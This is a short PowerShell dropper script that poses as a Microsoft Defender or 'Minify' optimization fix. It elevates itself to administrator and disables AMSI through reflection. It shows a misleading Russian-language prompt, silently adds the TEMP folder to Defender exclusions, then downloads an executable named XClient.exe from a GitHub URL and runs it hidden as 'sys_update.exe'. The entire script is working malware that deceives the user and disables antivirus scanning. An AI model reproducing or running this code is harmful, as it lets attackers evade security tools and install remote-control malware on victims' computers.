if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

Add-Type -AssemblyName System.Windows.Forms
$title = 'Настройка Microsoft Defender'
$text = "Обнаружен конфликт с компонентами оптимизации. Добавить Minify в исключения Microsoft Defender для стабильной работы?"
[System.Windows.Forms.MessageBox]::Show($text, $title, 4, 32)

Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue

$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

(New-Object System.Net.WebClient).DownloadFile($u, $p)

cmd /c start /b $p
